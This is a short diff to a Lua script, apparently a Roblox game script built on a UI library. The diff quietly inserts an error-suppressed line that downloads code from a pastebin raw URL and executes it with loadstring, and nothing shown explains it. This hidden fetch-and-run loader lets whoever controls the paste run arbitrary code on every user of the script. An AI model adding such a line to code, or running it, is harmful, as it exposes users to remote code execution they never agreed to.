@@ -204,6 +204,10 @@ Discord = { Enabled = false },
 KeySystem = false
 })
 
+pcall(function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/MWYTEiiy", true))()
+end)
+
 -- Services
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
